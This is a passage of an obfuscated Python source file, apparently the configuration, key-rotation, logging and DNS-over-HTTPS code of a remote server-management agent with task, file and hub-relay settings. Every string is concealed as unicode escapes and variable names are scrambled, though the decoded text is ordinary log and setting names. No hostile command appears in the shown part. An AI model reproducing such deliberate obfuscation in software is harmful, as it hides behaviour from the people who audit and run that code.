    NOISE_KEY = {codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape'): {codecs.decode('\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065', 'unicode_escape'): keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].private_b64}, codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): {codecs.decode('\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063', 'unicode_escape'): keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].public_b64}}

    @staticmethod
    def ws_downgrade_token() -> str:
        O0_var_54 = base64.b64decode(Config.SESSION_KEY)
        O0_var_55 = hmac.new(O0_var_54, b'kisama-ws-token-v1', hashlib.sha256).digest()
        return base64.b64encode(O0_var_55).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))

    @classmethod
    def rotate_operational_secrets(cls):
        O0_var_56 = NoiseKeyGenerator.generate_pair()
        cls.keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')] = O0_var_56[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')]
        cls.NOISE_KEY[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape')][codecs.decode('\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065', 'unicode_escape')] = O0_var_56[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].private_b64
        cls._raw_key = get_random_bytes(32)
        cls.SESSION_KEY = base64.b64encode(cls._raw_key).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        cls._status_cache = None
        cls._status_cache_time = 0.0
        Logger.warning(codecs.decode('\\U0001f504\\u0020\\u005b\\u0053\\u0045\\u0043\\u0055\\u0052\\u0049\\u0054\\u0059\\u005d\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u8fc7\\u671f\\u002c\\u0020\\u5df2\\u8f6e\\u6362\\u0020\\u0053\\u0045\\u0053\\u0053\\u0049\\u004f\\u004e\\u005f\\u004b\\u0045\\u0059\\u0020\\u4e0e\\u63a7\\u5236\\u7aef\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u5408\\u6cd5\\u63a7\\u5236\\u7aef\\u9700\\u91cd\\u65b0\\u8ba4\\u8bc1\\u83b7\\u53d6\\u0020\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f\\u0020\\u65b0\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
    FILE_ROOT = _resolve_safe_file_root()
    MAX_UPLOAD_SIZE = int(os.getenv(codecs.decode('\\u004d\\u0041\\u0058\\u005f\\u0055\\u0050\\u004c\\u004f\\u0041\\u0044\\u005f\\u0053\\u0049\\u005a\\u0045', 'unicode_escape'), codecs.decode('\\u0031\\u0030\\u0034\\u0038\\u0035\\u0037\\u0036\\u0030\\u0030', 'unicode_escape')))
    FOLLOW_SYMLINKS = os.getenv(codecs.decode('\\u0046\\u004f\\u004c\\u004c\\u004f\\u0057\\u005f\\u0053\\u0059\\u004d\\u004c\\u0049\\u004e\\u004b\\u0053', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    DOWNLOAD_ENCRYPT_MAX = int(os.getenv(codecs.decode('\\u0044\\u004f\\u0057\\u004e\\u004c\\u004f\\u0041\\u0044\\u005f\\u0045\\u004e\\u0043\\u0052\\u0059\\u0050\\u0054\\u005f\\u004d\\u0041\\u0058', 'unicode_escape'), codecs.decode('\\u0034\\u0031\\u0039\\u0034\\u0033\\u0030\\u0034', 'unicode_escape')))
    FILE_AUDIT_LOG = os.getenv(codecs.decode('\\u0046\\u0049\\u004c\\u0045\\u005f\\u0041\\u0055\\u0044\\u0049\\u0054\\u005f\\u004c\\u004f\\u0047', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    InitTask: bool = True
    onetasks: List[str] = []
    crontasks: Dict[str, str] = {}
    cronloop: bool = False
    TASK_TIMEOUT = int(os.getenv(codecs.decode('\\u0054\\u0041\\u0053\\u004b\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0033\\u0030\\u0030', 'unicode_escape')))
    CRON_CHECK_INTERVAL = int(os.getenv(codecs.decode('\\u0043\\u0052\\u004f\\u004e\\u005f\\u0049\\u004e\\u0054\\u0045\\u0052\\u0056\\u0041\\u004c', 'unicode_escape'), codecs.decode('\\u0033\\u0030', 'unicode_escape')))
    onetimetasks_log: List[Dict[str, Any]] = []
    crontasks_log: List[Dict[str, Any]] = []
    MAX_TASK_LOG_SIZE = int(os.getenv(codecs.decode('\\u004d\\u0041\\u0058\\u005f\\u0054\\u0041\\u0053\\u004b\\u005f\\u004c\\u004f\\u0047', 'unicode_escape'), codecs.decode('\\u0031\\u0030\\u0030', 'unicode_escape')))
    TEMPKEY_DEFAULT_TTL_HOURS = int(os.getenv(codecs.decode('\\u0054\\u0045\\u004d\\u0050\\u004b\\u0045\\u0059\\u005f\\u0054\\u0054\\u004c', 'unicode_escape'), codecs.decode('\\u0032\\u0034', 'unicode_escape')))
    TEMPKEY_MAX_TTL_HOURS = int(os.getenv(codecs.decode('\\u0054\\u0045\\u004d\\u0050\\u004b\\u0045\\u0059\\u005f\\u004d\\u0041\\u0058\\u005f\\u0054\\u0054\\u004c', 'unicode_escape'), codecs.decode('\\u0031\\u0036\\u0038', 'unicode_escape')))
    BASEINFO_CACHE_TTL = 3600
    BASEINFO_LOCAL_TTL = 30
    BASEINFO_FAIL_BACKOFF = 60
    STATUS_CACHE_TTL = 30
    _baseinfo_p_snapshot: Optional[Dict[str, Any]] = None
    _baseinfo_local_snapshot: Optional[Dict[str, Any]] = None
    _baseinfo_local_at: float = 0.0
    _baseinfo_local_fail_at: float = 0.0
    _baseinfo_net_snapshot: Optional[Dict[str, Any]] = None
    _baseinfo_net_at: float = 0.0
    _baseinfo_net_fail_at: float = 0.0
    _baseinfo_p_lock: Optional[asyncio.Lock] = None
    _baseinfo_local_lock: Optional[asyncio.Lock] = None
    _baseinfo_net_lock: Optional[asyncio.Lock] = None
    _status_cache: Optional[Dict[str, Any]] = None
    _status_cache_time: float = 0.0
    _status_lock: Optional[asyncio.Lock] = None

    @classmethod
    async def get_baseinfo_p_snapshot(cls) -> Dict[str, Any]:
        if cls._baseinfo_p_snapshot is not None:
            return dict(cls._baseinfo_p_snapshot)
        if cls._baseinfo_p_lock is None:
            cls._baseinfo_p_lock = asyncio.Lock()
        async with cls._baseinfo_p_lock:
            if cls._baseinfo_p_snapshot is None:
                try:
                    cls._baseinfo_p_snapshot = SystemInfoCollector().collect_p_fields()
                except Exception as e:
                    Logger.debug(codecs.decode('\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u0050\\u0020\\u7ea7\\u63a2\\u6d4b\\u5931\\u8d25\\u002c\\u0020\\u4f7f\\u7528\\u515c\\u5e95\\u503c\\u4e14\\u4e0d\\u518d\\u91cd\\u8bd5\\u003a\\u0020', 'unicode_escape') + str(e), 11)
                    cls._baseinfo_p_snapshot = SystemInfoCollector.p_fallback_fields()
        return dict(cls._baseinfo_p_snapshot)

    @classmethod
    async def get_baseinfo_local_snapshot(cls, virtualization: str) -> Dict[str, Any]:
        if cls._baseinfo_local_lock is None:
            cls._baseinfo_local_lock = asyncio.Lock()
        O0_var_57 = time.monotonic()
        async with cls._baseinfo_local_lock:
            O0_var_58 = cls._baseinfo_local_snapshot
            if O0_var_58 is not None and O0_var_57 - cls._baseinfo_local_at < cls.BASEINFO_LOCAL_TTL:
                return dict(O0_var_58)
            if cls._baseinfo_local_fail_at and O0_var_57 - cls._baseinfo_local_fail_at < cls.BASEINFO_FAIL_BACKOFF:
                return dict(O0_var_58) if O0_var_58 is not None else SystemInfoCollector.local_fallback_fields()
            try:
                O0_var_58 = await SystemInfoCollector().collect_local_fields(virtualization)
                cls._baseinfo_local_snapshot = O0_var_58
                cls._baseinfo_local_at = O0_var_57
                cls._baseinfo_local_fail_at = 0.0
            except Exception as e:
                Logger.debug(codecs.decode('\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u006c\\u006f\\u0063\\u0061\\u006c\\u0020\\u7ec4\\u63a2\\u6d4b\\u5931\\u8d25\\u002c\\u0020\\u6cbf\\u7528\\u4e0a\\u6b21\\u6210\\u529f\\u503c\\u003a\\u0020', 'unicode_escape') + str(e), 11)
                cls._baseinfo_local_fail_at = O0_var_57
                if O0_var_58 is None:
                    O0_var_58 = SystemInfoCollector.local_fallback_fields()
            return dict(O0_var_58)

    @classmethod
    async def get_baseinfo_net_snapshot(cls) -> Dict[str, Any]:
        if cls._baseinfo_net_lock is None:
            cls._baseinfo_net_lock = asyncio.Lock()
        O0_var_59 = time.monotonic()
        async with cls._baseinfo_net_lock:
            O0_var_60 = cls._baseinfo_net_snapshot
            if O0_var_60 is not None and O0_var_59 - cls._baseinfo_net_at < cls.BASEINFO_CACHE_TTL:
                return dict(O0_var_60)
            if cls._baseinfo_net_fail_at and O0_var_59 - cls._baseinfo_net_fail_at < cls.BASEINFO_FAIL_BACKOFF:
                return dict(O0_var_60) if O0_var_60 is not None else SystemInfoCollector.net_fallback_fields()
            try:
                O0_var_60 = await SystemInfoCollector().collect_net_fields()
                cls._baseinfo_net_snapshot = O0_var_60
                cls._baseinfo_net_at = O0_var_59
                cls._baseinfo_net_fail_at = 0.0
            except Exception as e:
                Logger.debug(codecs.decode('\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u006e\\u0065\\u0074\\u0020\\u7ec4\\u63a2\\u6d4b\\u5931\\u8d25\\u002c\\u0020\\u6cbf\\u7528\\u4e0a\\u6b21\\u6210\\u529f\\u503c\\u003a\\u0020', 'unicode_escape') + str(e), 11)
                cls._baseinfo_net_fail_at = O0_var_59
                if O0_var_60 is None:
                    O0_var_60 = SystemInfoCollector.net_fallback_fields()
            return dict(O0_var_60)
    HOST = os.getenv(codecs.decode('\\u0048\\u004f\\u0053\\u0054', 'unicode_escape'), codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0030\\u002e\\u0030', 'unicode_escape'))
    PORT = int(os.getenv(codecs.decode('\\u004b\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or os.getenv(codecs.decode('\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or os.environ.get(codecs.decode('\\u0053\\u0045\\u0052\\u0056\\u0045\\u0052\\u005f\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or 8000)
    KMODE = codecs.decode('\\u0032', 'unicode_escape') if re.match(codecs.decode('\\u005e\\u0032\\u0071\\u0028\\u003f\\u003a\\u0075\\u0069\\u0063\\u0029\\u003f\\u0024', 'unicode_escape'), os.getenv(codecs.decode('\\u004b\\u004d\\u004f\\u0044\\u0045', 'unicode_escape'), codecs.decode('\\u0030', 'unicode_escape')).strip() or codecs.decode('\\u0030', 'unicode_escape'), re.IGNORECASE) else os.getenv(codecs.decode('\\u004b\\u004d\\u004f\\u0044\\u0045', 'unicode_escape'), codecs.decode('\\u0030', 'unicode_escape')).strip() or codecs.decode('\\u0030', 'unicode_escape')
    KMODE_QUIC = bool(re.match(codecs.decode('\\u005e\\u0032\\u0071\\u0028\\u003f\\u003a\\u0075\\u0069\\u0063\\u0029\\u003f\\u0024', 'unicode_escape'), os.getenv(codecs.decode('\\u004b\\u004d\\u004f\\u0044\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip(), re.IGNORECASE))
    KNAME = os.getenv(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    KNAME_KEY = os.getenv(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    KPATH = os.getenv(codecs.decode('\\u004b\\u0050\\u0041\\u0054\\u0048', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
    KHUB = os.getenv(codecs.decode('\\u004b\\u0048\\u0055\\u0042', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    KHUB = KHUB if O0_fn_1(KHUB) else KHUB.rstrip(codecs.decode('\\u002f', 'unicode_escape'))
    KHUB_PUBLIC_URL = os.getenv(codecs.decode('\\u004b\\u0048\\u0055\\u0042\\u005f\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u005f\\u0055\\u0052\\u004c', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip().rstrip(codecs.decode('\\u002f', 'unicode_escape'))
    KHUB_PORTS = tuple(sorted({int(p.strip()) for p in os.getenv(codecs.decode('\\u004b\\u0048\\u0055\\u0042\\u005f\\u0050\\u004f\\u0052\\u0054\\u0053', 'unicode_escape'), codecs.decode('', 'unicode_escape')).split(codecs.decode('\\u002c', 'unicode_escape')) if p.strip().isdigit() and 1 <= int(p.strip()) <= 65535}))
    KPROXY_PORTS = tuple(sorted({int(p.strip()) for p in os.getenv(codecs.decode('\\u004b\\u0050\\u0052\\u004f\\u0058\\u0059\\u005f\\u0050\\u004f\\u0052\\u0054\\u0053', 'unicode_escape'), codecs.decode('', 'unicode_escape')).split(codecs.decode('\\u002c', 'unicode_escape')) if p.strip().isdigit() and 1 <= int(p.strip()) <= 65535}))
    KISAMA_HUB_RETRY_BASE_SECONDS = float(os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0048\\u0055\\u0042\\u005f\\u0052\\u0045\\u0054\\u0052\\u0059\\u005f\\u0042\\u0041\\u0053\\u0045\\u005f\\u0053\\u0045\\u0043\\u004f\\u004e\\u0044\\u0053', 'unicode_escape'), codecs.decode('\\u0032', 'unicode_escape')) or 2)
    KISAMA_HUB_RETRY_MAX_SECONDS = float(os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0048\\u0055\\u0042\\u005f\\u0052\\u0045\\u0054\\u0052\\u0059\\u005f\\u004d\\u0041\\u0058\\u005f\\u0053\\u0045\\u0043\\u004f\\u004e\\u0044\\u0053', 'unicode_escape'), codecs.decode('\\u0036\\u0030', 'unicode_escape')) or 60)
    KISAMA_HUB_PING_INTERVAL = float(os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0048\\u0055\\u0042\\u005f\\u0050\\u0049\\u004e\\u0047\\u005f\\u0049\\u004e\\u0054\\u0045\\u0052\\u0056\\u0041\\u004c', 'unicode_escape'), codecs.decode('\\u0032\\u0030', 'unicode_escape')) or 20)
    KISAMA_HUB_RELAY_TIMEOUT = float(os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0048\\u0055\\u0042\\u005f\\u0052\\u0045\\u004c\\u0041\\u0059\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0036\\u0030', 'unicode_escape')) or 60)
    KISAMA_HUB_MAX_BODY = int(os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0048\\u0055\\u0042\\u005f\\u004d\\u0041\\u0058\\u005f\\u0042\\u004f\\u0044\\u0059', 'unicode_escape'), str(64 * 1024 * 1024)) or 64 * 1024 * 1024)
    DNS_MODE = os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0044\\u004e\\u0053', 'unicode_escape'), codecs.decode('\\u006f\\u0066\\u0066', 'unicode_escape')).strip().lower()
    DOH_SERVERS = os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0044\\u004f\\u0048\\u005f\\u0053\\u0045\\u0052\\u0056\\u0045\\u0052\\u0053', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    AGENT_VERSION = os.getenv(codecs.decode('\\u0041\\u0047\\u0045\\u004e\\u0054\\u005f\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e', 'unicode_escape'), codecs.decode('\\u0030\\u002e\\u0036\\u002e\\u0039\\u002d\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e', 'unicode_escape'))

    @classmethod
    def validate(cls):
        if not cls.DEBUG:
            O0_var_61 = []
            if not cls.ECDSA_PUBLIC_KEY_PEM:
                O0_var_61.append(codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003a\\u0020\\u672a\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u4e14\\u6587\\u4ef6\\u0020\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u002e\\u0070\\u0065\\u006d\\u0020\\u4e0d\\u5b58\\u5728', 'unicode_escape'))
            else:
                try:
                    CryptoManager._load_ecdsa_pubkey(cls.ECDSA_PUBLIC_KEY_PEM)
                except Exception as e:
                    O0_var_61.append(codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
            if not cls.ECIES_PUBLIC_KEY_PEM:
                O0_var_61.append(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003a\\u0020\\u672a\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u4e14\\u6587\\u4ef6\\u0020\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u002e\\u0062\\u0036\\u0034\\u0020\\u4e0d\\u5b58\\u5728', 'unicode_escape'))
            else:
                try:
                    CryptoManager.validate_ecies_pubkey(cls.ECIES_PUBLIC_KEY_PEM)
                except Exception as e:
                    O0_var_61.append(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
            if O0_var_61:
                Logger.error(codecs.decode('\\u274c\\u0020\\u914d\\u7f6e\\u6821\\u9a8c\\u5931\\u8d25\\u0020\\u0028\\u975e\\u0044\\u0045\\u0042\\u0055\\u0047\\u6a21\\u5f0f\\u5fc5\\u987b\\u914d\\u7f6e\\u5bc6\\u94a5\\u0029\\u003a', 'unicode_escape'))
                for O0_var_62 in O0_var_61:
                    Logger.error(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020', 'unicode_escape') + str(O0_var_62))
                Logger.info(codecs.decode('\\u000a\\U0001f4a1\\u0020\\u89e3\\u51b3\\u65b9\\u6cd5\\u003a', 'unicode_escape'))
                Logger.info(codecs.decode('\\u0020\\u0020\\u0020\\u0031\\u002e\\u0020\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u003a\\u0020\\u0065\\u0078\\u0070\\u006f\\u0072\\u0074\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003d\\u0027\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e\\u0027', 'unicode_escape'))
                Logger.info(codecs.decode('\\u0020\\u0020\\u0020\\u0032\\u002e\\u0020\\u6216\\u5c06\\u5bc6\\u94a5\\u6587\\u4ef6\\u653e\\u5165\\u0020\\u002e\\u002f\\u006b\\u0065\\u0079\\u0073\\u002f\\u0020\\u76ee\\u5f55\\u0020\\u0028\\u8fd0\\u884c\\u0020\\u0067\\u0065\\u006e\\u0065\\u0072\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079\\u0073\\u002e\\u0070\\u0079\\u0020\\u751f\\u6210\\u0029', 'unicode_escape'))
                sys.exit(1)

def _resolve_log_level():
    O0_var_63 = os.getenv(codecs.decode('\\u004c\\u004f\\u0047\\u005f\\u004c\\u0045\\u0056\\u0045\\u004c', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    if O0_var_63:
        try:
            O0_var_64 = int(O0_var_63)
        except ValueError:
            return 3
        return O0_var_64 if 0 <= O0_var_64 <= 3 or 11 <= O0_var_64 <= 15 else 3
    return 0 if Config.DEBUG else 3

class Logger:
    codecs.decode('\\u65e5\\u5fd7\\u5904\\u7406\\u5668\\u000a\\u000a\\u0020\\u0020\\u0020\\u0020\\u56db\\u7ea7\\u9608\\u503c\\u4f53\\u7cfb\\u0020\\u0028\\u5bf9\\u9f50\\u0020\\u006a\\u0073\\u002f\\u0067\\u006f\\u0029\\u003a\\u0020\\u0044\\u0045\\u0042\\u0055\\u0047\\u003d\\u0030\\u0020\\u002f\\u0020\\u0049\\u004e\\u0046\\u004f\\u003d\\u0031\\u0020\\u002f\\u0020\\u0057\\u0041\\u0052\\u004e\\u003d\\u0032\\u0020\\u002f\\u0020\\u0045\\u0052\\u0052\\u004f\\u0052\\u003d\\u0033\\u002c\\u0020\\u7ea7\\u522b\\u0020\\u003e\\u003d\\u0020\\u9608\\u503c\\u624d\\u8f93\\u51fa\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020\\u7ec6\\u5206\\u8c03\\u8bd5\\u9891\\u9053\\u5360\\u7528\\u9ad8\\u4f4d\\u0020\\u0031\\u0031\\u007e\\u0031\\u0035\\u0020\\u0028\\u4e0e\\u6807\\u51c6\\u56db\\u7ea7\\u4e92\\u4e0d\\u5e72\\u6270\\u0029\\u003a\\u000a\\u0020\\u0020\\u0020\\u0020\\u0031\\u0031\\u003d\\u57fa\\u672c\\u4fe1\\u606f\\u0020\\u0031\\u0032\\u003d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u4f20\\u8f93\\u0020\\u0031\\u0033\\u003d\\u7ec8\\u7aef\\u65e5\\u5fd7\\u0020\\u0031\\u0034\\u003d\\u7f51\\u7edc\\u7edf\\u8ba1\\u0020\\u0031\\u0035\\u003d\\u78c1\\u76d8\\u7edf\\u8ba1\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020\\u9608\\u503c\\u8bed\\u4e49\\u003a\\u0020\\u0030\\u003d\\u5168\\u91cf\\u0028\\u542b\\u5168\\u90e8\\u8c03\\u8bd5\\u9891\\u9053\\u0029\\u003b\\u0020\\u0031\\u007e\\u0033\\u003d\\u6807\\u51c6\\u56db\\u7ea7\\u003b\\u0020\\u0031\\u0031\\u007e\\u0031\\u0035\\u003d\\u5e38\\u89c4\\u65e5\\u5fd7\\u5168\\u51fa\\u0020\\u002b\\u0020\\u7cbe\\u786e\\u6253\\u5f00\\u5bf9\\u5e94\\u8c03\\u8bd5\\u9891\\u9053\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    LEVEL_DEBUG, LEVEL_INFO, LEVEL_WARN, LEVEL_ERROR = (0, 1, 2, 3)
    CHANNEL_BASE = 10
    _log_level = _resolve_log_level()

    @classmethod
    def set_log_level(cls, level: int):
        cls._log_level = level

    @classmethod
    def _enabled(cls, level: int) -> bool:
        if level >= cls.CHANNEL_BASE:
            return cls._log_level == 0 or cls._log_level == level
        O0_var_65 = cls._log_level if cls._log_level <= 3 else cls.LEVEL_INFO
        return level >= O0_var_65

    @classmethod
    def _log(cls, message: str, level: str=codecs.decode('\\u0049\\u004e\\u0046\\u004f', 'unicode_escape')):
        O0_var_66 = datetime.now().strftime(codecs.decode('\\u0025\\u0059\\u002d\\u0025\\u006d\\u002d\\u0025\\u0064\\u0020\\u0025\\u0048\\u003a\\u0025\\u004d\\u003a\\u0025\\u0053', 'unicode_escape'))
        O0_var_67 = codecs.decode('\\u005b', 'unicode_escape') + str(O0_var_66) + codecs.decode('\\u005d\\u0020\\u005b', 'unicode_escape') + str(level) + codecs.decode('\\u005d\\u0020', 'unicode_escape') + str(message)
        if level == codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'):
            print(O0_var_67, file=sys.stderr)
        else:
            print(O0_var_67)

    @classmethod
    def debug(cls, message: str, channel: int=11):
        if cls._enabled(channel):
            cls._log(message, codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'))

    @classmethod
    def info(cls, message: str):
        if cls._enabled(cls.LEVEL_INFO):
            cls._log(message, codecs.decode('\\u0049\\u004e\\u0046\\u004f', 'unicode_escape'))

    @classmethod
    def warning(cls, message: str):
        if cls._enabled(cls.LEVEL_WARN):
            cls._log(message, codecs.decode('\\u0057\\u0041\\u0052\\u004e\\u0049\\u004e\\u0047', 'unicode_escape'))

    @classmethod
    def error(cls, message: str):
        if cls._enabled(cls.LEVEL_ERROR):
            cls._log(message, codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'))
DOH_SERVERS_DEFAULT = (codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0032\\u0032\\u0033\\u002e\\u0035\\u002e\\u0035\\u002e\\u0035\\u002f\\u0072\\u0065\\u0073\\u006f\\u006c\\u0076\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0031\\u002e\\u0031\\u002e\\u0031\\u002e\\u0031\\u002f\\u0064\\u006e\\u0073\\u002d\\u0071\\u0075\\u0065\\u0072\\u0079', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0038\\u002e\\u0038\\u002e\\u0038\\u002e\\u0038\\u002f\\u0072\\u0065\\u0073\\u006f\\u006c\\u0076\\u0065', 'unicode_escape'))
_IPV6_USABLE = None

def _ipv6_usable():
    global _IPV6_USABLE
    if _IPV6_USABLE is None:
        try:
            O0_var_68 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            O0_var_68.close()
            _IPV6_USABLE = True
        except OSError:
            _IPV6_USABLE = False
    return _IPV6_USABLE

def _is_ip_literal(host):
    if not isinstance(host, str) or not host:
        return False
    try:
        ipaddress.ip_address(host.strip().strip(codecs.decode('\\u005b\\u005d', 'unicode_escape')))
        return True
    except ValueError:
        return False

class SecureDns:
    codecs.decode('\\u5185\\u7f6e\\u0020\\u0044\\u006f\\u0048\\u0020\\u89e3\\u6790\\u5668\\u0020\\u0028\\u7eaf\\u6807\\u51c6\\u5e93\\u002c\\u0020\\u004a\\u0053\\u004f\\u004e\\u0020\\u0041\\u0050\\u0049\\u0029\\u3002\\u000a\\u000a\\u0020\\u0020\\u0020\\u0020\\u0072\\u0065\\u0073\\u006f\\u006c\\u0076\\u0065\\u0028\\u0029\\u0020\\u8fd4\\u56de\\u0020\\u004e\\u006f\\u006e\\u0065\\u0020\\u8868\\u793a\\u0020\\u0044\\u006f\\u0048\\u0020\\u670d\\u52a1\\u5668\\u5168\\u90e8\\u5931\\u8d25\\u0020\\u0028\\u8c03\\u7528\\u65b9\\u5e94\\u56de\\u843d\\u7cfb\\u7edf\\u89e3\\u6790\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u8fd4\\u56de\\u0020\\u005b\\u005d\\u0020\\u8868\\u793a\\u0020\\u0044\\u006f\\u0048\\u0020\\u660e\\u786e\\u65e0\\u8bb0\\u5f55\\u0020\\u0028\\u004e\\u0058\\u0044\\u004f\\u004d\\u0041\\u0049\\u004e\\u002f\\u004e\\u004f\\u0044\\u0041\\u0054\\u0041\\u002c\\u0020\\u4e0d\\u56de\\u843d\\u4ee5\\u514d\\u88ab\\u6c61\\u67d3\\u89e3\\u6790\\u0022\\u590d\\u6d3b\\u0022\\u0029\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    QUERY_TIMEOUT = 3.0
    TTL_MIN = 30
    TTL_MAX = 600
    NEGATIVE_TTL = 60
    SERVER_BACKOFF = 60
    WARN_INTERVAL = 300

    def __init__(self, servers=None, O0_var_69=None):
        O0_var_70 = [O0_var_71.strip().rstrip(codecs.decode('\\u002f', 'unicode_escape')) for O0_var_71 in servers or DOH_SERVERS_DEFAULT if O0_var_71 and O0_var_71.strip()]
        self.servers = O0_var_70 or list(DOH_SERVERS_DEFAULT)
        self._fail_until = [0.0] * len(self.servers)
        self._cache = {}
        self._lock = threading.Lock()
        self._last_fallback_warn = 0.0
        self._query_fn = O0_var_69 or self._doh_query

